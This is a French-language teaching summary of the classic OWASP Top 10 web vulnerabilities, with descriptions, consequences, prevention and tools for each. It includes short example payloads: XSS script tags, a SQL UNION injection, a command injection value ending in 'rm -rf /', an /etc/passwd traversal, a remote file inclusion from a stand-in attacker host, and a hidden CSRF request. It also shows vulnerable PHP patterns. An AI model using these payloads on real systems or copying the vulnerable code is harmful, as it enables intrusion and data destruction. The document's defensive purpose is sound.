### **A1. Cross-Site Scripting (XSS)**  
#### **Description** :  
Injection de code malveillant (généralement JavaScript) dans une page web, exécuté par le navigateur de la victime.  

#### **Types** :  
1. **XSS réfléchi** : Code injecté via une URL (ex. : formulaire de recherche).  
   - **Exemple** :  
     ```url
     https://victime.com/recherche?q=<script>alert('xss')</script>
     ```  
2. **XSS stocké** : Code persistant dans la base de données (ex. : forum, commentaires).  
   - **Exemple** :  
     ```html
     <img src=x onerror="voler_cookie()">
     ```  
3. **XSS basé sur le DOM** : Exploitation via JavaScript côté client.  

#### **Conséquences** :  
- Vol de cookies de session, usurpation d’identité, redirection vers des sites malveillants.  

#### **Prévention** :  
- **Validation des entrées** : Bloquer les caractères dangereux (`<`, `>`, `"`, `'`).  
- **Encodage des sorties** :  
  - HTML : `htmlspecialchars()` en PHP.  
  - JavaScript : `encodeURI()`.  
- **En-têtes de sécurité** :  
  - `Content-Security-Policy` (CSP) pour interdire les scripts externes.  
  - `HttpOnly` pour protéger les cookies.  

#### **Outils** :  
- **OWASP AntiSamy** pour nettoyer le HTML.  
- **BurpSuite** pour tester les payloads.  

---

### **A2. Failles d’injection (Injection Flaws)**  
#### **Description** :  
Exécution de commandes non intentionnelles via des requêtes malveillantes (SQL, OS, LDAP).  

#### **Exemples** :  
1. **SQL Injection** :  
   ```sql
   ' UNION SELECT username, password FROM users --
   ```  
2. **Command Injection** :  
   ```php
   system("ping " . $_GET['ip']); // Injection via ?ip=127.0.0.1; rm -rf /
   ```  

#### **Conséquences** :  
- Vol ou suppression de données, exécution de commandes système.  

#### **Prévention** :  
- **Requêtes préparées** :  
  - Java : `PreparedStatement`.  
  - PHP : `$pdo->prepare()`.  
- **Filtrage des entrées** : Bloquer les mots-clés SQL (ex. : `DROP`, `UNION`).  
- **Utilisation d’ORM** : Hibernate (Java), Doctrine (PHP).  

#### **Outils** :  
- **SQLMap** pour automatiser les tests.  
- **OWASP SQLi Validator**.  

---

### **A3. Exécution de fichiers malicieux (Arbitrary File Execution)**  
#### **Description** :  
Inclusion ou exécution de fichiers externes ou locaux via des vulnérabilités dans le code.  

#### **Exemples** :  
1. **Local File Inclusion (LFI)** :  
   ```url
   http://victime.com/page.php?page=../../etc/passwd
   ```  
2. **Remote File Inclusion (RFI)** :  
   ```url
   http://victime.com/page.php?page=http://attaquant.com/shell.txt
   ```  

#### **Conséquences** :  
- Exécution de code arbitraire, accès au système.  

#### **Prévention** :  
- Éviter les inclusions dynamiques non sécurisées (ex. : `include($_GET['page'])`).  
- Utiliser des listes blanches pour les fichiers autorisés.  

#### **Outils** :  
- **WebScarab** pour tester les inclusions.  

---

### **A4. Référence directe non sécurisée à un objet (IDOR)**  
#### **Description** :  
Accès à des ressources via des identifiants prévisibles ou non vérifiés.  

#### **Exemple** :  
```url
http://victime.com/document.php?id=123 → id=124
```  

#### **Conséquences** :  
- Accès non autorisé à des données sensibles.  

#### **Prévention** :  
- Vérifier les autorisations de l’utilisateur.  
- Utiliser des identifiants aléatoires (UUID).  

---

### **A5. Cross-Site Request Forgery (CSRF)**  
#### **Description** :  
Forcer un utilisateur à effectuer une action non désirée via une requête trompeuse.  

#### **Exemple** :  
```html
<img src="https://banque.com/virement?to=attaquant&montant=1000" width="0" height="0">
```  

#### **Conséquences** :  
- Transactions non autorisées, modifications de données.  

#### **Prévention** :  
- **Jetons CSRF** : Générer des tokens uniques par session.  
- Vérifier l’en-tête `Referer`.  

#### **Outils** :  
- **OWASP CSRFGuard** pour implémenter la protection.  

---

### **A6. Fuite d’information et traitement d’erreur incorrect**  
#### **Description** :  
Messages d’erreur détaillés révélant des informations sensibles (ex. : versions de serveurs).  

#### **Exemples** :  
- Erreurs SQL exposant des requêtes.  
- Traces de stack traces en production.  

#### **Conséquences** :  
- Aide à l’attaque (ex. : détection de vulnérabilités).  

#### **Prévention** :  
- Afficher des erreurs génériques.  
- Utiliser des gestionnaires d’exceptions centralisés.  

---

### **A7. Violation de gestion d’authentification et de sessions**  
#### **Description** :  
Problèmes liés à la création, la gestion ou la destruction des sessions.  

#### **Exemples** :  
- **Session Fixation** : Forcer un utilisateur à utiliser un ID de session connu.  
- **Vol de cookie** via XSS.  

#### **Prévention** :  
- Régénération des tokens après authentification.  
- Utiliser des cookies sécurisés (`HttpOnly`, `Secure`).  

---

### **A8. Stockage cryptographique non sécurisé**  
#### **Description** :  
Chiffrement faible ou absence de chiffrement pour les données sensibles.  

#### **Exemples** :  
- Stockage de mots de passe en clair.  
- Utilisation de MD5 pour le hachage.  

#### **Conséquences** :  
- Vol de données critiques (ex. : numéros de carte bancaire).  

#### **Prévention** :  
- Utiliser des algorithmes robustes (ex. : AES-256, bcrypt).  
- Respecter les normes comme PCI DSS.  

---

### **A9. Communications non sécurisées**  
#### **Description** :  
Transmission de données en clair via HTTP au lieu de HTTPS.  

#### **Conséquences** :  
- Interception des données par des attaquants (ex. : mots de passe).  

#### **Prévention** :  
- Forcer l’utilisation de HTTPS.  
- Configurer HSTS (HTTP Strict Transport Security).  

---

### **A10. Défaillance dans la restriction des accès URL**  
#### **Description** :  
Absence de contrôle d’accès sur des pages sensibles.  

#### **Exemple** :  
- Accès à `/admin/` sans authentification.  

#### **Conséquences** :  
- Accès non autorisé à des fonctionnalités critiques.  

#### **Prévention** :  
- Vérifier les rôles et permissions à chaque niveau (client et serveur).  
- Utiliser des frameworks de sécurité (ex. : Spring Security).  

---
